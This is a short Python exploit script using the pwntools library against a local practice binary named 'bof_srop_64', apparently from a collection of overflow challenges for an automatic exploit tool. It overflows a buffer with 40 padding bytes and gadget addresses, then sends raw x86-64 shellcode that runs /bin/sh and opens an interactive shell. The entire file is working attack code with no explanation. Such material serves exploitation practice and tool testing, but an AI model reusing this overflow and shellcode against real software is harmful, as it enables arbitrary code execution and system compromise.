from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_srop_64")
pwn.gdb.attach(p)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
payload = b"\x00" * 40
payload += p64(0x401171) + p64(0x404980) + p64(0x401070) + p64(0x404980)
payload += b"\n"
p.send(payload)
payload = b""
payload += b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
payload += b"\n"
p.send(payload)
p.interactive()
